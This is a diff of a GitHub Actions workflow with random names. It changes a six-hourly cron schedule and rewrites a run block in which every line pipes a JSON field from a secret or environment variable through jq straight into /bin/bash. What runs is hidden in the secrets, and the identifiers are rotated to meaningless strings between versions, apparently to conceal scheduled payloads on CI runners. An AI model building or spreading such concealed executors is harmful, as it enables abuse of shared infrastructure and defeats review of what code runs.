@@ -2,22 +2,22 @@ name: longaodi2374
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
+    - cron: '10 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: longaodi2374
         env:
-          zqk3: ${{ secrets.zqk3 }}
+          xroez7402: ${{ secrets.xroez7402 }}
         run: |
-          echo $zqk3 | jq -r .o707 | /bin/bash
-          echo $hccbg3533 | jq -r .wdwv07 | /bin/bash
-          echo $wqb8094 | jq -r .fjhx79515 | /bin/bash
-          echo $d0171 | jq -r .f143 | /bin/bash
-          echo $vz4627 | jq -r .znrjo05 | /bin/bash
-          echo $dqfr38073 | jq -r .y765 | /bin/bash
-          echo $s05639 | jq -r .hy25 | /bin/bash
+          echo $xroez7402 | jq -r .ssvti15276 | /bin/bash
+          echo $b757 | jq -r .nywwf733 | /bin/bash
+          echo $wvf3936 | jq -r .bdlt4561 | /bin/bash
+          echo $pxz2 | jq -r .c30262 | /bin/bash
+          echo $gxpl25326 | jq -r .conmp99210 | /bin/bash
+          echo $ezseq103 | jq -r .plkj4101 | /bin/bash
 
